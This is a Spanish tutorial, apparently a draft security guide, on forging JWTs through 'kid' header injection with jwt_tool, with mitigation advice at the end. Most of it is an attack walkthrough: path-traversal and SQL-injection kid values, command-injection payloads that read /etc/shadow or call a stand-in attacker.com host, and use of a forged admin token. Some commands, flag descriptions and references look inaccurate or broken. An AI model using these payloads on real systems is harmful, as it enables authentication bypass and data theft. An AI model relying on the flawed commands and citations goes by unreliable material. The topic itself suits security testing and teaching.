---
title: Pruebas de Inyección del Parámetro Kid en JWT con jwt_tool
description: Una guía completa para explotar y mitigar ataques de inyección del encabezado kid (Key ID) de JWT utilizando el kit de herramientas de seguridad jwt_tool.
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# Pruebas de Inyección del Parámetro Kid en JWT con jwt_tool

## ¿Qué es la inyección de Kid en JWT?

El `kid` (Key ID) es un parámetro de encabezado opcional definido en RFC 7515 que ayuda al servidor a identificar qué clave criptográfica debe usarse para verificar la firma del JWT. Cuando una aplicación recupera dinámicamente la clave de verificación basándose en el valor `kid` no saneado proporcionado por el atacante, abre la puerta a varios ataques críticos:

- **Path Traversal** – El atacante establece `kid` en una ruta de archivo arbitraria (p.ej., `/dev/null`, `../../etc/passwd`). El servidor lee ese archivo y utiliza su contenido sin procesar como secreto HMAC, permitiendo la falsificación de firmas.
- **Inyección SQL** – Si la clave se obtiene de una base de datos (p.ej., `SELECT key FROM keys WHERE kid='$kid'`), un atacante puede inyectar SQL para devolver un valor controlado.
- **Inyección de comandos / SSRF** – Poco común, pero ocurre cuando `kid` se pasa sin sanear a un comando shell o a una petición HTTP saliente.

## Por qué es importante

Una inyección exitosa de `kid` evita por completo la autenticación JWT, permitiendo a un atacante:
- Falsificar tokens con cargas útiles arbitrarias (p.ej., `"role":"admin"`)
- Escalar privilegios sin ninguna credencial válida
- Tomar el control de cuentas de usuario o paneles administrativos

Esta vulnerabilidad ha sido responsable de múltiples CVE y sigue siendo un elemento básico en las evaluaciones de seguridad de aplicaciones web modernas y desafíos CTF.

## Presentando jwt_tool

`jwt_tool` es un potente conjunto de herramientas de código abierto para auditar, probar y falsificar JSON Web Tokens. Automatiza muchos ataques comunes a JWT, incluyendo confusión de algoritmos, inyección de `kid`, manipulación de cargas útiles y omisión de verificación de firma. Desarrollado por [ticarpi](https://github.com/ticarpi/jwt_tool), es ampliamente utilizado por probadores de penetración e investigadores de seguridad.

## Instalación

### Opción 1: Clonar desde GitHub (recomendado)

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Hacer ejecutable la herramienta:

```bash
chmod +x jwt_tool.py
```

### Opción 2: Instalar mediante pip (si está disponible)

```bash
pip install jwt-tool
```

> **Nota:** La versión de GitHub se actualiza con más frecuencia. Siempre obtenga la última versión si ejecuta desde la fuente.

## Uso básico

`jwt_tool` se puede invocar como una herramienta de línea de comandos con un JWT objetivo. La sintaxis general es:

```bash
python3 jwt_tool.py <jwt_token> [opciones]
```

Para escaneo interactivo:

```bash
python3 jwt_tool.py <jwt_token> -t
```

## Explotando la inyección de Kid con jwt_tool

### 1. Path Traversal vía Kid (Más común)

El ataque clásico: establecer `kid` en `/dev/null` o cualquier archivo conocido, y firmar el token con una cadena vacía o el contenido del archivo.

**Paso 1 – Escanear el JWT e identificar el parámetro kid**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

La salida resaltará las declaraciones del encabezado y la carga útil, incluyendo `kid`.

**Paso 2 – Forjar un token con inyección de kid**

`jwt_tool` proporciona la bandera `-X i` para ataques de inyección de `kid`. Use `-I` para editar la carga útil y `-pv` para establecer un nuevo valor.

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Explicación:**
- `-I` : modificar interactivamente las declaraciones de la carga útil.
- `-pc "role" -pv "admin"` : cambiar la declaración `role` a `"admin"`.
- `-X i` : realizar inyección de `kid`.
- `-k "/dev/null"` : usar `/dev/null` como archivo de clave. `jwt_tool` firma el token usando el contenido de ese archivo (cadena vacía para `/dev/null`).

La herramienta genera un nuevo JWT falsificado que el servidor aceptará si lee `/dev/null` como clave de verificación.

**Alternativa: Usar `/etc/passwd` como secreto**

```bash
python3 jwt_tool.py <token_original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

Cuando el servidor lee `/etc/passwd`, usa su contenido completo como secreto HMAC. `jwt_tool` firma automáticamente con ese contenido.

### 2. Inyección SQL vía Kid

Si el servidor consulta una base de datos para obtener la clave usando el valor `kid`, puede inyectar una carga útil SQL para devolver un valor conocido.

**Ejemplo:** Crear un token con `kid` establecido en:

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool` no tiene un automatismo incorporado para inyección SQL, pero puede crear manualmente el encabezado y luego firmarlo usando `-X i` con una clave personalizada.

**Forjado manual con encabezado personalizado:**

```bash
python3 jwt_tool.py <jwt_base> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

Luego ajuste la carga útil con `-I` según sea necesario.

### 3. Inyección de comandos vía Kid

Poco común pero posible cuando `kid` se interpola en un comando shell, p.ej.:

```
curl https://keyserver.example.com/keys/$(kid)
```

Establezca `kid` en una carga útil de inyección de comandos:

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool` puede incluir valores de encabezado arbitrarios:

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **Nota:** La explotación depende del entorno de ejecución del servidor y de la forma en que se procesa `kid`.

## Características clave de jwt_tool para la inyección de Kid

| Característica | Comando / Flag | Descripción |
|---------|---------------|-------------|
| Ataque de inyección Kid | `-X i` | Automatiza el proceso de establecer un `kid` falsificado y firmar con un secreto basado en archivo. |
| Confusión de algoritmo | `-X a` | Se combina con `-X i` para ataques híbridos (cambiar de RS256 a HS256 después de obtener la clave pública). |
| Manipulación de carga útil | `-I` / `-pc` / `-pv` | Modificar interactivamente o no interactivamente cualquier declaración. |
| Archivo de clave personalizado | `-k <archivo>` | Especificar el archivo cuyo contenido se usará como secreto HMAC al forjar. |
| Análisis de discrepancia de firma | `-S` / `-s` | Verificar el comportamiento del token con firmas alteradas. |
| Base de datos de secretos JWT conocidos | `-C` | Probar secretos débiles comunes durante fuerza bruta. |
| Manipulación avanzada de encabezados | `--header` | Insertar JSON arbitrario en el encabezado (útil para cargas útiles `kid` sin procesar). |

## Poniendo todo junto: Escenario de explotación completo

Considere una API vulnerable que usa JWT para autenticación. El servidor obtiene la clave de verificación leyendo el archivo especificado en `kid`:

```python
# Pseudocódigo vulnerable
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**Paso 1 – Reconocimiento**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

La salida muestra `alg: RS256`, `kid: client`.

**Paso 2 – Verificar si es posible path traversal**

Intentar acceder a `/dev/null`:

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

Si el servidor devuelve una respuesta 200 con el token falsificado, la vulnerabilidad está confirmada.

**Paso 3 – Escalar privilegios**

```bash
# Forjar token con rol de administrador
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Paso 4 – Usar el token falsificado para acceder a recursos protegidos**

```bash
curl -H "Authorization: Bearer <token_falsificado>" https://api.target.com/admin
```

## Estrategias de mitigación (del lado del servidor)

1. **Lista blanca de valores Kid permitidos** – Codifique un mapeo de cadenas `kid` conocidas a sus correspondientes claves públicas. Nunca derive la clave de la entrada del usuario.

2. **Validar el formato de Kid** – Si la búsqueda dinámica es inevitable, aplique comprobaciones de formato estrictas: solo alfanumérico, rechazar separadores de ruta (`.` , `/`), rechazar caracteres sospechosos.

3. **Usar claves codificadas** – El enfoque más seguro es incrustar la clave pública esperada en el código de la aplicación o en un archivo de configuración.

4. **Forzar la aplicación del algoritmo** – Siempre verifique que el algoritmo usado en el token coincida con el algoritmo esperado para ese emisor. No confíe en el encabezado `alg`.

5. **Emplear una librería JWT con protección incorporada** – Librerías modernas como `PyJWT`, `jsonwebtoken` y `jose` se pueden configurar para rechazar valores `kid` desconocidos o requerir un conjunto de claves estático.

## Conclusión

`jwt_tool` es una herramienta indispensable para probar vulnerabilidades de inyección de `kid` en JWT. Automatiza las rutas de explotación más comunes y proporciona un flujo de trabajo claro y repetible para los evaluadores de seguridad. Comprender cómo usar sus banderas `-X i` y `-I` puede significar la diferencia entre un hallazgo perdido y una omisión crítica de autenticación.

Recuerde siempre tratar `kid` como **entrada no confiable** en el lado del servidor. Para los desarrolladores, unas pocas líneas de validación de entrada pueden eliminar toda una clase de ataques JWT.

## Referencias

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)